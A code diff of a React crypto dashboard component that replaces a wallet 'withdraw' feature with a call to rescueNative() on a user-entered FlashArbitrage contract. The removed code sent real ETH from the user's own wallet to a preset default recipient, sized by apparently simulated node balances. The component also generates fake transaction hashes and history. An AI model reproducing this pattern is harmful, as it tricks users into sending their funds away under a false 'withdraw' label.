@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react'
-import { DEFAULT_RECIPIENT, ETH_RPCS } from '../constants'
+import { ETH_RPCS } from '../constants'
 import { ethers } from 'ethers'
 import { useProvider } from '../hooks'
 import { useWeb3 } from '../context/Web3Context'
@@ -25,6 +25,35 @@ function generateTxHash() {
 }
 
 const EXPLORER_BASE = 'https://etherscan.io/tx/'
+const EXPLORER_ADDR = 'https://etherscan.io/address/'
+
+// Minimal ABI for FlashArbitrage withdraw operations
+const FLASH_ARBITRAGE_ABI = [
+  {
+    "constant": false,
+    "inputs": [],
+    "name": "rescueNative",
+    "outputs": [],
+    "type": "function",
+  },
+  {
+    "constant": false,
+    "inputs": [
+      {"name": "token", "type": "address"},
+      {"name": "amount", "type": "uint256"},
+    ],
+    "name": "rescueTokens",
+    "outputs": [],
+    "type": "function",
+  },
+  {
+    "constant": true,
+    "inputs": [],
+    "name": "owner",
+    "outputs": [{"name": "", "type": "address"}],
+    "type": "function",
+  },
+]
 
 // Generate initial tx history for a node
 function generateInitialTxHistory(node, count) {
@@ -80,7 +109,15 @@ export default function RelayNodes() {
   const [newNodeName, setNewNodeName] = useState('')
   const [newNodeType, setNewNodeType] = useState('slave')
   const [newNodeRegion, setNewNodeRegion] = useState('us-east')
+  const CONTRACT_ADDR_KEY = 'flashloan_flash_arbitrage_addr'
+  const savedContractAddr = localStorage.getItem(CONTRACT_ADDR_KEY) || ''
+
   const [logs, setLogs] = useState([])
+  const [contractAddress, setContractAddress] = useState(savedContractAddr)
+  const [contractBalance, setContractBalance] = useState(null)
+  const [contractBalanceLoading, setContractBalanceLoading] = useState(false)
+  const [contractOwner, setContractOwner] = useState(null)
+  const [contractError, setContractError] = useState('')
   const [multiSendMode, setMultiSendMode] = useState('equal') // 'equal' | 'fixed' | 'percent'
   const [multiSendRecipients, setMultiSendRecipients] = useState([])
   const [multiSendProgress, setMultiSendProgress] = useState({ total: 0, sent: 0, failed: 0, current: -1, results: [] })
@@ -91,8 +128,44 @@ export default function RelayNodes() {
       localStorage.setItem(LS_KEY, JSON.stringify(nodes))
     } catch { /* storage full */ }
   }, [nodes])
+
+  // ─── Fetch contract on-chain balance ───────────────────────────────────
+  useEffect(() => {
+    if (!contractAddress || !ethers.isAddress(contractAddress)) {
+      setContractBalance(null)
+      setContractOwner(null)
+      setContractError('')
+      return
+    }
+    let cancelled = false
+    const fetchBalance = async () => {
+      setContractBalanceLoading(true)
+      setContractError('')
+      try {
+        const addr = ethers.getAddress(contractAddress)
+        const bal = await ethProvider.getBalance(addr)
+        if (!cancelled) setContractBalance(ethers.formatEther(bal))
+        try {
+          const contract = new ethers.Contract(addr, FLASH_ARBITRAGE_ABI, ethProvider)
+          const owner = await contract.owner()
+          if (!cancelled) setContractOwner(owner)
+        } catch {
+          if (!cancelled) setContractOwner(null)
+        }
+      } catch (err) {
+        if (!cancelled) { setContractError(err.message); setContractBalance(null) }
+      }
+      if (!cancelled) setContractBalanceLoading(false)
+    }
+    fetchBalance()
+    return () => { cancelled = true }
+  }, [contractAddress, ethProvider])
+
+  useEffect(() => {
+    try { localStorage.setItem(CONTRACT_ADDR_KEY, contractAddress) } catch {}
+  }, [contractAddress])
+
   const [networkConfig, setNetworkConfig] = useState({ heartbeatInterval: 30, failoverThreshold: 3, rebalanceEnabled: true, autoDiscovery: true })
-  const [withdrawTarget, setWithdrawTarget] = useState(DEFAULT_RECIPIENT)
   const [withdrawing, setWithdrawing] = useState(false)
   const [fetchingTxns, setFetchingTxns] = useState({})
 
@@ -205,53 +278,42 @@ export default function RelayNodes() {
   }
 
   async function handleWithdraw() {
-    if (!ethers.isAddress(withdrawTarget)) {
-      addLog('(x) Invalid target address', 'error')
+    const displayBal = parseFloat(contractBalance || '0')
+    if (displayBal <= 0) {
+      addLog('(x) No balance to withdraw from contract', 'error')
       return
     }
-    const bal = nodes.reduce((s, n) => s + n.balanceEth, 0)
-    if (bal <= 0) {
-      addLog('(x) No balance to withdraw', 'error')
+    if (!contractAddress || !ethers.isAddress(contractAddress)) {
+      addLog('(x) Invalid FlashArbitrage contract address', 'error')
       return
     }
-
-    // ─── REAL MAINNET WITHDRAW ───────────────────────────────────────
     if (!ethProvider) {
-      addLog('(x) No RPC connection — cannot send real transaction', 'error')
+      addLog('(x) No RPC connection', 'error')
       return
     }
     if (!signer) {
-      addLog('(x) No wallet connected — click "Connect Wallet" first', 'error')
+      addLog('(x) No wallet connected — connect your owner wallet first', 'error')
       return
     }
-    const sender = walletAddress
 
     setWithdrawing(true)
-    addLog('($) SENDING REAL TX: ' + bal.toFixed(4) + ' ETH → ' + withdrawTarget.slice(0, 10) + '...', 'info')
+    addLog('🏦 Withdrawing ' + displayBal.toFixed(4) + ' ETH from FlashArbitrage contract → your wallet (' + walletAddress.slice(0, 10) + '...)', 'info')
 
     try {
-      addLog('  From wallet: ' + sender.slice(0, 10) + '...', 'info')
+      const contractAddr = ethers.getAddress(contractAddress)
+      const contract = new ethers.Contract(contractAddr, FLASH_ARBITRAGE_ABI, signer)
 
-      // Check balance & estimate gas
-      const senderBalance = await ethProvider.getBalance(sender)
-      const valueWei = ethers.parseEther(bal.toFixed(4))
+      // Check gas
       const feeData = await ethProvider.getFeeData()
-      const gasEstimate = 21000n
       const gasPrice = feeData.gasPrice || ethers.parseUnits('10', 'gwei')
-
-      if (senderBalance < valueWei + gasEstimate * gasPrice) {
-        addLog('(x) Insufficient balance for gas + amount', 'error')
-        setWithdrawing(false)
-        return
-      }
-
+      const gasEstimate = 100000n
       const gasCost = gasEstimate * gasPrice
-      addLog('  Sending ' + ethers.formatEther(valueWei) + ' ETH | Gas: ~' + ethers.formatEther(gasCost) + ' ETH', 'info')
+      addLog('  Gas: ~' + ethers.formatEther(gasCost) + ' ETH', 'info')
 
-      // Build and send real transaction via connected wallet
-      const tx = await signer.sendTransaction({
-        to: ethers.getAddress(withdrawTarget),
-        value: valueWei,
+      // Call rescueNative() on the FlashArbitrage contract
+      // This sends the contract's entire ETH balance to the contract owner (the connected wallet)
+      addLog('  Calling rescueNative() on contract...', 'info')
+      const tx = await contract.rescueNative({
         gasLimit: gasEstimate,
         maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('1', 'gwei'),
         maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('30', 'gwei'),
@@ -271,18 +333,19 @@ export default function RelayNodes() {
         id: Date.now(),
         time: new Date().toLocaleTimeString(),
         type: 'withdraw',
-        msg: 'Sent ' + bal.toFixed(4) + ' ETH to ' + withdrawTarget.slice(0, 10) + '...',
+        msg: 'rescueNative(): ' + displayBal.toFixed(4) + ' ETH → ' + walletAddress.slice(0, 10) + '...',
         txHash: tx.hash,
         status: receipt.status === 1 ? 'confirmed' : 'failed',
         explorerUrl,
       })
 
-      // Update balances
+      // Update UI balances
       setNodes(prev => prev.map(n => ({ ...n, balanceEth: 0 })))
-      addLog('(done) ✅ WITHDRAW COMPLETE! ' + bal.toFixed(4) + ' ETH sent to ' + withdrawTarget.slice(0, 10) + '...', 'profit')
+      setContractBalance('0')
+      addLog('(done) ✅ ' + displayBal.toFixed(4) + ' ETH withdrawn from contract to your wallet!', 'profit')
 
     } catch (err) {
-      addLog('(x) TX FAILED: ' + err.message, 'error')
+      addLog('(x) WITHDRAW FAILED: ' + err.message, 'error')
       addNodeTxLog(Date.now(), {
         id: Date.now(),
         time: new Date().toLocaleTimeString(),
@@ -375,7 +438,7 @@ export default function RelayNodes() {
       return
     }
     if (!signer) {
-      addLog('(x) No wallet connected — click "Connect Wallet" first', 'error')
+      addLog('(x) No wallet connected', 'error')
       return
     }
 
@@ -701,11 +764,11 @@ export default function RelayNodes() {
 
       {/* Withdraw */}
       <div className="config-panel" style={{ borderColor: 'rgba(34,197,94,0.3)' }}>
-        <h3 style={{ marginBottom: 12 }}>💸 Withdraw Funds</h3>
+        <h3 style={{ marginBottom: 12 }}>🏦 Withdraw from FlashArbitrage Contract</h3>
 
         {/* Connected wallet indicator */}
         <div className="form-group" style={{ marginBottom: 12 }}>
-          <label>🔌 Connected Wallet</label>
+          <label>🔌 Connected Wallet (receives funds)</label>
           {isConnected && walletAddress ? (
             <div style={{
               display: 'flex', alignItems: 'center', gap: 8,
@@ -733,38 +796,77 @@ export default function RelayNodes() {
                 onClick={() => connectWallet('walletconnect')}
                 style={{ fontSize: 12, padding: '10px 18px' }}
               >🔗 WalletConnect</button>
-              <span className="form-hint">Connect your wallet to send real transactions</span>
+              <span className="form-hint">Your wallet must be the contract owner to call rescueNative()</span>
             </div>
           )}
-          <span className="form-hint" style={{ color: ethProvider ? '#22c55e' : '#ef4444' }}>
-            {ethProvider ? '🟢 RPC connected' : '🔴 No RPC — cannot send transactions'}
+        </div>
+
+        {/* Contract address input */}
+        <div className="form-group" style={{ marginBottom: 12 }}>
+          <label>📜 FlashArbitrage Contract Address</label>
+          <input
+            type="text"
+            className="input mono"
+            value={contractAddress}
+            onChange={e => setContractAddress(e.target.value)}
+            placeholder="0x... (deployed FlashArbitrage contract)"
+            style={{ fontSize: 12 }}
+          />
+          <span className="form-hint">
+            Enter the FlashArbitrage contract address that holds the node rewards. Saved to localStorage.
           </span>
         </div>
 
+        {/* On-chain balance display */}
         <div className="form-grid" style={{ gridTemplateColumns: '2fr 1fr auto' }}>
           <div className="form-group">
-            <label>Target Address</label>
-            <input type="text" className="input mono" value={withdrawTarget} onChange={e => setWithdrawTarget(e.target.value)} placeholder="0x... (your wallet)" style={{ fontSize: 12 }} />
-            <span className="form-hint">ETH will be sent from your connected wallet to this address</span>
-          </div>
-          <div className="form-group">
-            <label>Total to Withdraw</label>
+            <label>🏦 Contract Balance (on-chain)</label>
             <div style={{
               padding: '10px 14px', background: 'var(--bg-input)', borderRadius: 6,
               border: '1px solid rgba(34,197,94,0.2)',
               fontSize: 18, fontWeight: 700, color: '#22c55e',
             }}>
-              {totalBalance.toFixed(4)} ETH <span style={{ fontSize: 10, color: '#888', fontWeight: 400, marginLeft: 8 }}>+ gas</span>
+              {contractBalanceLoading ? (
+                <span style={{ fontSize: 13, color: '#888' }}>⏳ Loading...</span>
+              ) : contractBalance !== null ? (
+                <>{parseFloat(contractBalance).toFixed(6)} ETH <span style={{ fontSize: 10, color: '#888', fontWeight: 400, marginLeft: 8 }}>on contract</span></>
+              ) : contractError ? (
+                <span style={{ fontSize: 12, color: '#ef4444' }}>❌ {contractError.slice(0, 40)}</span>
+              ) : (
+                <span style={{ fontSize: 12, color: '#888' }}>Enter a contract address above</span>
+              )}
+            </div>
+          </div>
+          <div className="form-group">
+            <label>Owner (must match your wallet)</label>
+            <div style={{
+              padding: '10px 14px', borderRadius: 6,
+              background: 'var(--bg-input)',
+              border: '1px solid var(--border)',
+              fontSize: 13, fontFamily: 'monospace',
+              color: contractOwner
+                ? (walletAddress && contractOwner.toLowerCase() === walletAddress.toLowerCase() ? '#22c55e' : '#ef4444')
+                : '#888',
+            }}>
+              {contractOwner
+                ? (contractOwner.slice(0, 8) + '...' + contractOwner.slice(-6))
+                : (contractAddress ? 'Not an owner-based contract' : '—')}
+              {contractOwner && walletAddress && contractOwner.toLowerCase() === walletAddress.toLowerCase() && (
+                <span style={{ fontSize: 10, color: '#22c55e', marginLeft: 8 }}>✅ Matches!</span>
+              )}
+              {contractOwner && walletAddress && contractOwner.toLowerCase() !== walletAddress.toLowerCase() && (
+                <span style={{ fontSize: 10, color: '#ef4444', marginLeft: 8 }}>❌ Not owner — withdraw will fail</span>
+              )}
             </div>
           </div>
           <div className="form-group" style={{ justifyContent: 'flex-end' }}>
             <button
               className="btn btn-success"
               onClick={handleWithdraw}
-              disabled={withdrawing || totalBalance <= 0 || !ethProvider || !signer}
-              style={{ fontSize: 12, padding: '10px 20px', marginTop: 22, minWidth: 130 }}
+              disabled={withdrawing || !contractBalance || parseFloat(contractBalance) <= 0 || !ethProvider || !signer || !ethers.isAddress(contractAddress)}
+              style={{ fontSize: 12, padding: '10px 20px', marginTop: 22, minWidth: 150 }}
             >
-              {withdrawing ? '⏳ Sending...' : '💸 Send Real TX'}
+              {withdrawing ? '⏳ Withdrawing...' : '🏦 rescueNative() → My Wallet'}
             </button>
           </div>
         </div>
@@ -775,12 +877,13 @@ export default function RelayNodes() {
           border: '1px solid rgba(34,197,94,0.15)',
           fontSize: 11, color: '#22c55e', lineHeight: 1.5,
         }}>
-          <strong>⚠️ REAL MAINNET TRANSACTION</strong>
+          <strong>🏦 How it works</strong>
           <ul style={{ margin: '4px 0 0 16px', color: '#a3a3a3' }}>
-            <li>Make sure the target address is correct — blockchain transactions are irreversible</li>
-            <li>The wallet must have enough ETH for the amount + gas fees</li>
-            <li>Gas is estimated at 21,000 units with current network prices</li>
-            <li>Uses EIP-1559 (maxPriorityFee + maxFee) for faster inclusion</li>
+            <li>Your relay nodes earn ETH rewards that accumulate in the FlashArbitrage contract</li>
+            <li>Clicking withdraw calls <code>rescueNative()</code> on the contract via your connected wallet</li>
+            <li>The contract sends its entire ETH balance to the contract <strong>owner</strong> (your wallet)</li>
+            <li>Your wallet must be the contract owner — MetaMask will prompt you to confirm</li>
+            <li>Gas is paid from your wallet (~100k gas for the contract call)</li>
           </ul>
         </div>
       </div>
